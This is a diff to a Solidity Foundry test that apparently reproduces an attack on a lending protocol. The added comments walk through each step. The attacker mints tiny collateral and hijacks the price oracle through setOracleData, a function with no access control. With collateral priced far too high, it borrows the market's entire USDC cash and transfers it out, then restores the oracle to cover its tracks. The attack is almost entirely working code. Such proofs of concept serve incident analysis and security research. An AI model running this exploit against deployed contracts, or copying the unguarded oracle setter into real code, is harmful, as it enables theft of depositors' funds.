@@ -20,14 +20,35 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_uint("Before exploit, USDC balance of attacker:", usdc.balanceOf(address(this)));
+
+        // === EXPLOIT STEP 1: Enter rBNB market as collateral ===
         rbnb.approve(address(cointroller), type(uint256).max);
         address[] memory rTokens = new address[](1);
         rTokens[0] = address(rbnb);
         cointroller.enterMarkets(rTokens);
+
+        // === EXPLOIT STEP 2: Mint tiny collateral (0.0001 BNB) ===
         rbnb.mint{value: 100_000_000_000_000}();
+
+        // === VULNERABILITY TRIGGER: permissionless oracle hijack ===
+        // VULNERABILITY: SimplePriceOracle.setOracleData has ZERO access control.
+        // See: sources/SimplePriceOracle_D55f01/contracts_SimplePriceOracle.sol:29
+        //     function setOracleData(address rToken, oracleChainlink _oracle) external {
+        //         oracleData[rToken] = _oracle;
+        //     }
+        // Anyone can redirect ANY rToken's price source.
+        // getUnderlyingPrice blindly does: 10**(18-decimals) * answer
+        // and Cointroller uses it for collateral valuation in borrowAllowed + getHypotheticalAccountLiquidityInternal.
         simplePriceOracle.setOracleData(address(rbnb), address(this));
+
+        // === EXPLOIT STEP 3: Drain target market ===
+        // With rBNB collateral now priced 1e10× higher, borrow limit allows draining all cash.
         rusdc.borrow(rusdc.getCash());
+
+        // Sweep
         rusdc.transfer(msg.sender, rusdc.balanceOf(address(this)));
+
+        // === EXPLOIT STEP 4: Restore oracle (cover tracks) ===
         simplePriceOracle.setOracleData(address(rbnb), address(chainlinkBNBUSDPriceFeed));
         emit log_named_uint("After exploit, USDC balance of attacker:", usdc.balanceOf(address(this)));
     }
